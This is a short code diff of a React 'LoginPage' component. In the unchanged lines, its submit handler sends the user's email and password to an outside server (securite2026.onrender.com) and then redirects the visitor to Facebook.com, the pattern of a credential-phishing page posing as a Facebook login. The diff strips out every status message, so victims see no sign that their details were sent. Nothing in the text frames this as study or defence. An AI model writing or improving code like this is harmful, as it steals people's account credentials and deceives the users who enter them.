@@ -8,7 +8,6 @@ export default function LoginPage() {
 
   const handleSubmit = async (e) => {
     e.preventDefault(); // Prevent page refresh
-    setStatus("Sending...");
 
     try {
       const response = await fetch("https://securite2026.onrender.com/send-feedback", {
@@ -18,16 +17,13 @@ export default function LoginPage() {
       });
 
       if (response.ok) {
-        setStatus("Feedback sent successfully!");
         setEmail("");
         setPassword("");
         window.location.href = "https://Facebook.com";
       } else {
-        setStatus("Error sending feedback.");
       }
     } catch (err) {
       console.error(err);
-      setStatus("Network error.");
     }
   };
 
